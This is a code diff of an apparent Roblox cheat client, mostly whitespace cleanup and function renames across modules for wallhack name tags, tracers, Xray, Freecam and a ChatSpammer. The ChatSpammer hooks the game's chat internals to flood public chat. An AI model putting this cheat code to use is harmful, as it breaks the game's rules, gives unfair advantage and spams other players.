 	ChamsOnTop = Chams.CreateToggle({
-		Name = "Bypass Walls", 
+		Name = "Bypass Walls",
 		Function = function(callback) if Chams.Enabled then Chams.ToggleButton(true) Chams.ToggleButton(true) end end
 	})
 end)
 
-runFunction(function()
+run(function()
 	local lightingsettings = {}
 	local lightingchanged = false
 	local Fullbright = {Enabled = false}
 	Fullbright = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
 		Name = "Fullbright",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				lightingsettings.Brightness = lightingService.Brightness
 				lightingsettings.ClockTime = lightingService.ClockTime
 				lightingsettings.FogEnd = lightingService.FogEnd
@@ -3386,7 +3703,7 @@ runFunction(function()
 					end
 				end))
 			else
-				for name, val in pairs(lightingsettings) do 
+				for name, val in pairs(lightingsettings) do
 					lightingService[name] = val
 				end
 			end
@@ -3394,11 +3711,11 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Health = {Enabled = false}
 	Health =  GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "Health", 
-		Function = function(callback) 
+		Name = "Health",
+		Function = function(callback)
 			if callback then
 				HealthText = Drawing.new("Text")
 				HealthText.Size = 20
@@ -3426,15 +3743,10 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local function floorNameTagPosition(pos)
 		return Vector2.new(math.floor(pos.X), math.floor(pos.Y))
 	end
-
-	local function removeTags(str)
-        str = str:gsub("<br%s*/>", "\n")
-        return (str:gsub("<[^<>]->", ""))
-    end
 
 	local NameTagsFolder = Instance.new("Folder")
 	NameTagsFolder.Name = "NameTagsFolder"
@@ -3465,12 +3777,12 @@ runFunction(function()
 			thing.Font = Enum.Font[NameTagsFont.Value]
 			thing.TextSize = 14 * (NameTagsScale.Value / 10)
 			thing.BackgroundTransparency = NameTagsBackground.Enabled and 0.5 or 1
-			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
+			nametagstrs[plr.Player] = whitelist:tag(plr.Player, true)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
 			if NameTagsHealth.Enabled then
 				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(plr.Humanoid.Health).."</font>"
 			end
-			if NameTagsDistance.Enabled then 
+			if NameTagsDistance.Enabled then
 				nametagstrs[plr.Player] = '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">%s</font><font color="rgb(85, 255, 85)">]</font> '..nametagstrs[plr.Player]
 			end
 			local nametagSize = textService:GetTextSize(removeTags(nametagstrs[plr.Player]), thing.TextSize, thing.Font, Vector2.new(100000, 100000))
@@ -3493,12 +3805,12 @@ runFunction(function()
 			thing.Main.BG.Visible = NameTagsBackground.Enabled
 			thing.Main.BG.Color = Color3.new()
 			thing.Main.BG.ZIndex = 1
-			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
+			nametagstrs[plr.Player] = whitelist:tag(plr.Player, true)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
 			if NameTagsHealth.Enabled then
 				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' '..math.round(plr.Humanoid.Health)
 			end
-			if NameTagsDistance.Enabled then 
+			if NameTagsDistance.Enabled then
 				nametagstrs[plr.Player] = '[%s] '..nametagstrs[plr.Player]
 			end
 			thing.Main.Text.Text = nametagstrs[plr.Player]
@@ -3512,14 +3824,14 @@ runFunction(function()
 		Normal = function(ent)
 			local v = nametagsfolderdrawing[ent]
 			nametagsfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				v.Main:Destroy()
 			end
 		end,
 		Drawing = function(ent)
 			local v = nametagsfolderdrawing[ent]
 			nametagsfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				for i2,v2 in pairs(v.Main) do
 					pcall(function() v2.Visible = false v2:Remove() end)
 				end
@@ -3530,13 +3842,13 @@ runFunction(function()
 	local nametagupdatefuncs = {
 		Normal = function(ent)
 			local v = nametagsfolderdrawing[ent.Player]
-			if v then 
-				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
+			if v then
+				nametagstrs[ent.Player] = whitelist:tag(ent.Player, true)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
 				if NameTagsHealth.Enabled then
 					local color = Color3.fromHSV(math.clamp(ent.Humanoid.Health / ent.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(ent.Humanoid.Health).."</font>"
 				end
-				if NameTagsDistance.Enabled then 
+				if NameTagsDistance.Enabled then
 					nametagstrs[ent.Player] = '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">%s</font><font color="rgb(85, 255, 85)">]</font> '..nametagstrs[ent.Player]
 				end
 				local nametagSize = textService:GetTextSize(removeTags(nametagstrs[ent.Player]), v.Main.TextSize, v.Main.Font, Vector2.new(100000, 100000))
@@ -3546,12 +3858,12 @@ runFunction(function()
 		end,
 		Drawing = function(ent)
 			local v = nametagsfolderdrawing[ent.Player]
-			if v then 
-				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
+			if v then
+				nametagstrs[ent.Player] = whitelist:tag(ent.Player, true)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
 				if NameTagsHealth.Enabled then
 					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' '..math.round(ent.Humanoid.Health)
 				end
-				if NameTagsDistance.Enabled then 
+				if NameTagsDistance.Enabled then
 					nametagstrs[ent.Player] = '[%s] '..nametagstrs[ent.Player]
 					v.Main.Text.Text = entityLibrary.isAlive and string.format(nametagstrs[ent.Player], math.floor((entityLibrary.character.HumanoidRootPart.Position - ent.RootPart.Position).Magnitude)) or nametagstrs[ent.Player]
 				else
@@ -3566,13 +3878,13 @@ runFunction(function()
 	local nametagcolorfuncs = {
 		Normal = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do
 				v.Main.TextColor3 = getPlayerColor(v.entity.Player) or color
 			end
 		end,
 		Drawing = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do
 				v.Main.Text.Color = getPlayerColor(v.entity.Player) or color
 			end
 		end
@@ -3580,16 +3892,16 @@ runFunction(function()
 
 	local nametagloop = {
 		Normal = function()
-			for i,v in pairs(nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do
 				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
-				if not headVis then 
+				if not headVis then
 					v.Main.Visible = false
 					continue
 				end
 				if NameTagsDistance.Enabled and entityLibrary.isAlive then
 					local mag = math.floor((entityLibrary.character.HumanoidRootPart.Position - v.entity.RootPart.Position).Magnitude)
 					local stringsize = tostring(mag):len()
-					if nametagsizes[v.entity.Player] ~= stringsize then 
+					if nametagsizes[v.entity.Player] ~= stringsize then
 						local nametagSize = textService:GetTextSize(removeTags(string.format(nametagstrs[v.entity.Player], mag)), v.Main.TextSize, v.Main.Font, Vector2.new(100000, 100000))
 						v.Main.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
 					end
@@ -3601,9 +3913,9 @@ runFunction(function()
 			end
 		end,
 		Drawing = function()
-			for i,v in pairs(nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do
 				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
-				if not headVis then 
+				if not headVis then
 					v.Main.Text.Visible = false
 					v.Main.BG.Visible = false
 					continue
@@ -3612,7 +3924,7 @@ runFunction(function()
 					local mag = math.floor((entityLibrary.character.HumanoidRootPart.Position - v.entity.RootPart.Position).Magnitude)
 					local stringsize = tostring(mag):len()
 					v.Main.Text.Text = string.format(nametagstrs[v.entity.Player], mag)
-					if nametagsizes[v.entity.Player] ~= stringsize then 
+					if nametagsizes[v.entity.Player] ~= stringsize then
 						v.Main.BG.Size = Vector2.new(v.Main.Text.TextBounds.X + 4, v.Main.Text.TextBounds.Y)
 					end
 					nametagsizes[v.entity.Player] = stringsize
@@ -3629,8 +3941,8 @@ runFunction(function()
 
 	local NameTags = {Enabled = false}
 	NameTags = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "NameTags", 
-		Function = function(callback) 
+		Name = "NameTags",
+		Function = function(callback)
 			if callback then
 				methodused = NameTagsDrawing.Enabled and "Drawing" or "Normal"
 				if nametagfuncs2[methodused] then
@@ -3638,7 +3950,7 @@ runFunction(function()
 				end
 				if nametagfuncs1[methodused] then
 					local addfunc = nametagfuncs1[methodused]
-					for i,v in pairs(entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do
 						if nametagsfolderdrawing[v.Player] then nametagfuncs2[methodused](v.Player) end
 						addfunc(v)
 					end
@@ -3649,22 +3961,22 @@ runFunction(function()
 				end
 				if nametagupdatefuncs[methodused] then
 					table.insert(NameTags.Connections, entityLibrary.entityUpdatedEvent:Connect(nametagupdatefuncs[methodused]))
-					for i,v in pairs(entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do
 						nametagupdatefuncs[methodused](v)
 					end
 				end
-				if nametagcolorfuncs[methodused] then 
+				if nametagcolorfuncs[methodused] then
 					table.insert(NameTags.Connections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendColorRefresh.Event:Connect(function()
 						nametagcolorfuncs[methodused](NameTagsColor.Hue, NameTagsColor.Sat, NameTagsColor.Value)
 					end))
 				end
-				if nametagloop[methodused] then 
+				if nametagloop[methodused] then
 					RunLoops:BindToRenderStep("NameTags", nametagloop[methodused])
 				end
 			else
 				RunLoops:UnbindFromRenderStep("NameTags")
 				if nametagfuncs2[methodused] then
-					for i,v in pairs(nametagsfolderdrawing) do 
+					for i,v in pairs(nametagsfolderdrawing) do
 						nametagfuncs2[methodused](i)
 					end
 				end
@@ -3672,8 +3984,8 @@ runFunction(function()
 		end,
 		HoverText = "Renders nametags on entities through walls."
 	})
-	for i,v in pairs(Enum.Font:GetEnumItems()) do 
-		if v.Name ~= "SourceSans" then 
+	for i,v in pairs(Enum.Font:GetEnumItems()) do
+		if v.Name ~= "SourceSans" then
 			table.insert(fontitems, v.Name)
 		end
 	end
@@ -3683,9 +3995,9 @@ runFunction(function()
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
 	})
 	NameTagsColor = NameTags.CreateColorSlider({
-		Name = "Player Color", 
-		Function = function(hue, sat, val) 
-			if NameTags.Enabled and nametagcolorfuncs[methodused] then 
+		Name = "Player Color",
+		Function = function(hue, sat, val)
+			if NameTags.Enabled and nametagcolorfuncs[methodused] then
 				nametagcolorfuncs[methodused](hue, sat, val)
 			end
 		end
@@ -3698,25 +4010,25 @@ runFunction(function()
 		Max = 50
 	})
 	NameTagsBackground = NameTags.CreateToggle({
-		Name = "Background", 
+		Name = "Background",
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
 		Default = true
 	})
 	NameTagsDisplayName = NameTags.CreateToggle({
-		Name = "Use Display Name", 
+		Name = "Use Display Name",
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
 		Default = true
 	})
 	NameTagsHealth = NameTags.CreateToggle({
-		Name = "Health", 
+		Name = "Health",
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end
 	})
 	NameTagsDistance = NameTags.CreateToggle({
-		Name = "Distance", 
+		Name = "Distance",
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end
 	})
 	NameTagsTeammates = NameTags.CreateToggle({
-		Name = "Teammates", 
+		Name = "Teammates",
 		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
 		Default = true
 	})
@@ -3726,7 +4038,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Search = {Enabled = false}
 	local SearchTextList = {RefreshValues = function() end, ObjectList = {}}
 	local SearchColor = {Value = 0.44}
@@ -3757,8 +4069,8 @@ runFunction(function()
 		end
 	end
 	Search = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "Search", 
-		Function = function(callback) 
+		Name = "Search",
+		Function = function(callback)
 			if callback then
 				searchRefresh()
 				table.insert(Search.Connections, workspace.DescendantAdded:Connect(function(v)
@@ -3786,7 +4098,7 @@ runFunction(function()
 		HoverText = "Draws a box around selected parts\nAdd parts in Search frame"
 	})
 	SearchColor = Search.CreateColorSlider({
-		Name = "new part color", 
+		Name = "new part color",
 		Function = function(hue, sat, val)
 			for i,v in pairs(SearchFolder:GetChildren()) do
 				v.FillColor = Color3.fromHSV(hue, sat, val)
@@ -3795,21 +4107,21 @@ runFunction(function()
 	})
 	SearchTextList = Search.CreateTextList({
 		Name = "SearchList",
-		TempText = "part name", 
+		TempText = "part name",
 		AddFunction = function(user)
 			searchRefresh()
-		end, 
-		RemoveFunction = function(num) 
+		end,
+		RemoveFunction = function(num)
 			searchRefresh()
 		end
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Xray = {Enabled = false}
 	Xray = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-		Name = "Xray", 
-		Function = function(callback) 
+		Name = "Xray",
+		Function = function(callback)
 			if callback then
 				table.insert(Xray.Connections, workspace.DescendantAdded:Connect(function(v)
 					if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") and not v.Parent.Parent:FindFirstChild("Humanoid") then
@@ -3832,7 +4144,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local TracersColor = {Value = 0.44}
 	local TracersTransparency = {Value = 1}
 	local TracersStartPosition = {Value = "Middle"}
@@ -3864,7 +4176,7 @@ runFunction(function()
 		Drawing = function(ent)
 			local v = tracersfolderdrawing[ent]
 			tracersfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				pcall(function() v.Main.Visible = false v.Main:Remove() end)
 			end
 		end,
@@ -3872,7 +4184,7 @@ runFunction(function()
 	local tracerscolorfuncs = {
 		Drawing = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(tracersfolderdrawing) do 
+			for i,v in pairs(tracersfolderdrawing) do
 				v.Main.Color = getPlayerColor(v.entity.Player) or color
 			end
 		end
@@ -3881,7 +4193,7 @@ runFunction(function()
 	tracersfuncs2.DrawingV3 = tracersfuncs2.Drawing
 	local tracersloop = {
 		Drawing = function()
-			for i,v in pairs(tracersfolderdrawing) do 
+			for i,v in pairs(tracersfolderdrawing) do
 				local rootPart = v.entity[TracersEndPosition.Value == "Torso" and "RootPart" or "Head"].Position
 				local rootPos, rootVis = worldtoviewportpoint(rootPart)
 				local screensize = gameCamera.ViewportSize
@@ -3896,8 +4208,8 @@ runFunction(function()
 
 	local Tracers = {Enabled = false}
 	Tracers = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "Tracers", 
-		Function = function(callback) 
+		Name = "Tracers",
+		Function = function(callback)
 			if callback then
 				methodused = "Drawing"..synapsev3
 				if tracersfuncs2[methodused] then
@@ -3905,7 +4217,7 @@ runFunction(function()
 				end
 				if tracersfuncs1[methodused] then
 					local addfunc = tracersfuncs1[methodused]
-					for i,v in pairs(entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do
 						if tracersfolderdrawing[v.Player] then tracersfuncs2[methodused](v.Player) end
 						addfunc(v)
 					end
@@ -3914,17 +4226,17 @@ runFunction(function()
 						addfunc(ent)
 					end))
 				end
-				if tracerscolorfuncs[methodused] then 
+				if tracerscolorfuncs[methodused] then
 					table.insert(Tracers.Connections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendColorRefresh.Event:Connect(function()
 						tracerscolorfuncs[methodused](TracersColor.Hue, TracersColor.Sat, TracersColor.Value)
 					end))
 				end
-				if tracersloop[methodused] then 
+				if tracersloop[methodused] then
 					RunLoops:BindToRenderStep("Tracers", tracersloop[methodused])
 				end
 			else
 				RunLoops:UnbindFromRenderStep("Tracers")
-				for i,v in pairs(tracersfolderdrawing) do 
+				for i,v in pairs(tracersfolderdrawing) do
 					if tracersfuncs2[methodused] then
 						tracersfuncs2[methodused](i)
 					end
@@ -3944,20 +4256,20 @@ runFunction(function()
 		Function = function() if Tracers.Enabled then Tracers.ToggleButton(true) Tracers.ToggleButton(true) end end
 	})
 	TracersColor = Tracers.CreateColorSlider({
-		Name = "Player Color", 
-		Function = function(hue, sat, val) 
-			if Tracers.Enabled and tracerscolorfuncs[methodused] then 
+		Name = "Player Color",
+		Function = function(hue, sat, val)
+			if Tracers.Enabled and tracerscolorfuncs[methodused] then
 				tracerscolorfuncs[methodused](hue, sat, val)
 			end
 		end
 	})
 	TracersTransparency = Tracers.CreateSlider({
-		Name = "Transparency", 
+		Name = "Transparency",
 		Min = 1,
-		Max = 100, 
-		Function = function(val) 
-			for i,v in pairs(tracersfolderdrawing) do 
-				if v.Main then 
+		Max = 100,
+		Function = function(val)
+			for i,v in pairs(tracersfolderdrawing) do
+				if v.Main then
 					v.Main[methodused == "DrawingV3" and "Opacity" or "Transparency"] = 1 - (val / 100)
 				end
 			end
@@ -3971,7 +4283,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	Spring = {} do
 		Spring.__index = Spring
 
@@ -4175,7 +4487,7 @@ runFunction(function()
 	end
 
 	local Freecam = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-		Name = "Freecam", 
+		Name = "Freecam",
 		Function = function(callback)
 			if callback then
 				local cameraCFrame = gameCamera.CFrame
@@ -4222,9 +4534,9 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Panic = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "Panic", 
+		Name = "Panic",
 		Function = function(callback)
 			if callback then
 				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do
@@ -4236,10 +4548,10 @@ runFunction(function()
 				end
 			end
 		end
-	}) 
+	})
 end)
 
-runFunction(function()
+run(function()
 	local ChatSpammer = {Enabled = false}
 	local ChatSpammerDelay = {Value = 10}
 	local ChatSpammerHideWait = {Enabled = true}
@@ -4254,7 +4566,7 @@ runFunction(function()
 		Name = "ChatSpammer",
 		Function = function(callback)
 			if callback then
-				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 					task.spawn(function()
 						repeat
 							if ChatSpammer.Enabled then
@@ -4276,11 +4588,11 @@ runFunction(function()
 							lplr.PlayerGui:WaitForChild("Chat", 10)
 							chatspammerfirstexecute = false
 						end
-						if lplr.PlayerGui:FindFirstChild("Chat") and lplr.PlayerGui.Chat:FindFirstChild("Frame") and lplr.PlayerGui.Chat.Frame:FindFirstChild("ChatChannelParentFrame") and replicatedStorageService:FindFirstChild("DefaultChatSystemChatEvents") then
+						if lplr.PlayerGui:FindFirstChild("Chat") and lplr.PlayerGui.Chat:FindFirstChild("Frame") and lplr.PlayerGui.Chat.Frame:FindFirstChild("ChatChannelParentFrame") and replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
 							if not chatspammerhook then
 								task.spawn(function()
 									chatspammerhook = true
-									for i,v in pairs(getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
+									for i,v in pairs(getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
 										if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
 											oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
 											oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
@@ -4309,7 +4621,7 @@ runFunction(function()
 							task.spawn(function()
 								repeat
 									pcall(function()
-										replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer((#ChatSpammerMessages.ObjectList > 0 and ChatSpammerMessages.ObjectList[math.random(1, #ChatSpammerMessages.ObjectList)] or "vxpe on top"), "All")
+										replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer((#ChatSpammerMessages.ObjectList > 0 and ChatSpammerMessages.ObjectList[math.random(1, #ChatSpammerMessages.ObjectList)] or "vxpe on top"), "All")
 									end)
 									if waitnum ~= 0 then
 										task.wait(waitnum)
@@ -4318,7 +4630,7 @@ runFunction(function()
 										task.wait(ChatSpammerDelay.Value / 10)
 									end
 								until not ChatSpammer.Enabled
-							end)				
+							end)
 						else
 							warningNotification("ChatSpammer", "Default chat not found.", 3)
 							if ChatSpammer.Enabled then ChatSpammer.ToggleButton(false) end
@@ -4350,7 +4662,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local controlmodule
 	local oldmove
 	local SafeWalk = {Enabled = false}
@@ -4386,7 +4698,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local function capeFunction(char, texture)
 		for i,v in pairs(char:GetDescendants()) do
 			if v.Name == "Cape" then
@@ -4411,7 +4723,7 @@ runFunction(function()
 		p.Transparency = 1
 		local decal
 		local video = false
-		if texture:find(".webm") then 
+		if texture:find(".webm") then
 			video = true
 			local decal2 = Instance.new("SurfaceGui", p)
 			decal2.Adornee = p
@@ -4439,7 +4751,7 @@ runFunction(function()
 		motor.C1 = CFrame.new(0, 1, 0.45) * CFrame.Angles(0, math.rad(90), 0)
 		local wave = false
 		repeat task.wait(1/44)
-			if video then 
+			if video then
 				decal.Visible = torso.LocalTransparencyModifier ~= 1
 			else
 				decal.Transparency = torso.Transparency
@@ -4480,7 +4792,7 @@ runFunction(function()
 							id = CapeBox.Value
 						end
 						successfulcustom = "rbxassetid://"..id
-					elseif (not isfile(CapeBox.Value)) then 
+					elseif (not isfile(CapeBox.Value)) then
 						warningNotification("Cape", "Missing file", 5)
 					else
 						successfulcustom = CapeBox.Value:find(".") and getcustomasset(CapeBox.Value) or CapeBox.Value
@@ -4488,14 +4800,14 @@ runFunction(function()
 				end
 				table.insert(Cape.Connections, lplr.CharacterAdded:Connect(function(char)
 					task.spawn(function()
-						pcall(function() 
+						pcall(function()
 							capeFunction(char, (successfulcustom or downloadVapeAsset("vape/assets/VapeCape.png")))
 						end)
 					end)
 				end))
 				if lplr.Character then
 					task.spawn(function()
-						pcall(function() 
+						pcall(function()
 							capeFunction(lplr.Character, (successfulcustom or downloadVapeAsset("vape/assets/VapeCape.png")))
 						end)
 					end)
@@ -4514,9 +4826,9 @@ runFunction(function()
 	CapeBox = Cape.CreateTextBox({
 		Name = "File",
 		TempText = "File (link)",
-		FocusLost = function(enter) 
-			if enter then 
-				if Cape.Enabled then 
+		FocusLost = function(enter)
+			if enter then
+				if Cape.Enabled then
 					Cape.ToggleButton(false)
 					Cape.ToggleButton(false)
 				end
@@ -4525,7 +4837,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local ChinaHat = {Enabled = false}
 	local ChinaHatColor = {Hue = 1, Sat=1, Value=0.33}
 	local chinahattrail
@@ -4557,7 +4869,7 @@ runFunction(function()
 						chinahattrail.Velocity = Vector3.zero
 						chinahattrail.LocalTransparencyModifier = ((gameCamera.CFrame.Position - gameCamera.Focus.Position).Magnitude <= 0.6 and 1 or 0)
 					else
-						if chinahattrail then 
+						if chinahattrail then
 							chinahattrail:Destroy()
 							chinahattrail = nil
 						end
@@ -4575,15 +4887,15 @@ runFunction(function()
 	})
 	ChinaHatColor = ChinaHat.CreateColorSlider({
 		Name = "Hat Color",
-		Function = function(h, s, v) 
-			if chinahattrail then 
+		Function = function(h, s, v)
+			if chinahattrail then
 				chinahattrail.Color = Color3.fromHSV(h, s, v)
 			end
 		end
 	})
 end)
 
-runFunction(function()
+run(function()
 	local FieldOfView = {Enabled = false}
 	local FieldOfViewZoom = {Enabled = false}
 	local FieldOfViewValue = {Value = 70}
@@ -4627,7 +4939,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Swim = {Enabled = false}
 	local SwimVertical = {Value = 1}
 	local swimconnection
@@ -4653,7 +4965,7 @@ runFunction(function()
 						entityLibrary.character.HumanoidRootPart.Velocity = ((moving or inputService:IsKeyDown(Enum.KeyCode.Space)) and Vector3.new(moving and rootvelo.X or 0, inputService:IsKeyDown(Enum.KeyCode.Space) and SwimVertical.Value or rootvelo.Y, moving and rootvelo.Z or 0) or Vector3.zero)
 					end)
 				end
-			else 
+			else
 				GravityChangeTick = tick() + 0.1
 				workspace.Gravity = oldgravity
 				RunLoops:UnbindFromHeartbeat("Swim")
@@ -4677,7 +4989,7 @@ runFunction(function()
 end)
 
 
-runFunction(function()
+run(function()
 	local Breadcrumbs = {Enabled = false}
 	local BreadcrumbsLifetime = {Value = 20}
 	local BreadcrumbsThickness = {Value = 7}
@@ -4699,7 +5011,7 @@ runFunction(function()
 								breadcrumbattachment2 = Instance.new("Attachment")
 								breadcrumbattachment2.Position = Vector3.new(0, -0.07 - 2.7, 0)
 								breadcrumbtrail = Instance.new("Trail")
-								breadcrumbtrail.Attachment0 = breadcrumbattachment 
+								breadcrumbtrail.Attachment0 = breadcrumbattachment
 								breadcrumbtrail.Attachment1 = breadcrumbattachment2
 								breadcrumbtrail.Color = ColorSequence.new(Color3.fromHSV(BreadcrumbsFadeIn.Hue, BreadcrumbsFadeIn.Sat, BreadcrumbsFadeIn.Value), Color3.fromHSV(BreadcrumbsFadeOut.Hue, BreadcrumbsFadeOut.Sat, BreadcrumbsFadeOut.Value))
 								breadcrumbtrail.FaceCamera = true
@@ -4711,7 +5023,7 @@ runFunction(function()
 									breadcrumbattachment2.Parent = entityLibrary.character.HumanoidRootPart
 									breadcrumbtrail.Parent = gameCamera
 								end)
-								if not suc then 
+								if not suc then
 									if breadcrumbtrail then breadcrumbtrail:Destroy() breadcrumbtrail = nil end
 									if breadcrumbattachment then breadcrumbattachment:Destroy() breadcrumbattachment = nil end
 									if breadcrumbattachment2 then breadcrumbattachment2:Destroy() breadcrumbattachment2 = nil end
@@ -4732,7 +5044,7 @@ runFunction(function()
 	BreadcrumbsFadeIn = Breadcrumbs.CreateColorSlider({
 		Name = "Fade In",
 		Function = function(hue, sat, val)
-			if breadcrumbtrail then 
+			if breadcrumbtrail then
 				breadcrumbtrail.Color = ColorSequence.new(Color3.fromHSV(hue, sat, val), Color3.fromHSV(BreadcrumbsFadeOut.Hue, BreadcrumbsFadeOut.Sat, BreadcrumbsFadeOut.Value))
 			end
 		end
@@ -4740,7 +5052,7 @@ runFunction(function()
 	BreadcrumbsFadeOut = Breadcrumbs.CreateColorSlider({
 		Name = "Fade Out",
 		Function = function(hue, sat, val)
-			if breadcrumbtrail then 
+			if breadcrumbtrail then
 				breadcrumbtrail.Color = ColorSequence.new(Color3.fromHSV(BreadcrumbsFadeIn.Hue, BreadcrumbsFadeIn.Sat, BreadcrumbsFadeIn.Value), Color3.fromHSV(hue, sat, val))
 			end
 		end
@@ -4749,8 +5061,8 @@ runFunction(function()
 		Name = "Lifetime",
 		Min = 1,
 		Max = 100,
-		Function = function(val) 
-			if breadcrumbtrail then 
+		Function = function(val)
+			if breadcrumbtrail then
 				breadcrumbtrail.Lifetime = val / 10
 			end
 		end,
@@ -4761,11 +5073,11 @@ runFunction(function()
 		Name = "Thickness",
 		Min = 1,
 		Max = 30,
-		Function = function(val) 
-			if breadcrumbattachment then 
+		Function = function(val)
+			if breadcrumbattachment then
 				breadcrumbattachment.Position = Vector3.new(0, (val / 100) - 2.7, 0)
 			end
-			if breadcrumbattachment2 then 
+			if breadcrumbattachment2 then
 				breadcrumbattachment2.Position = Vector3.new(0, -(val / 100) - 2.7, 0)
 			end
 		end,
@@ -4774,7 +5086,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local AutoReport = {Enabled = false}
 	local AutoReportList = {ObjectList = {}}
 	local AutoReportNotify = {Enabled = false}
@@ -4783,9 +5095,9 @@ runFunction(function()
 	local function removerepeat(str)
 		local newstr = ""
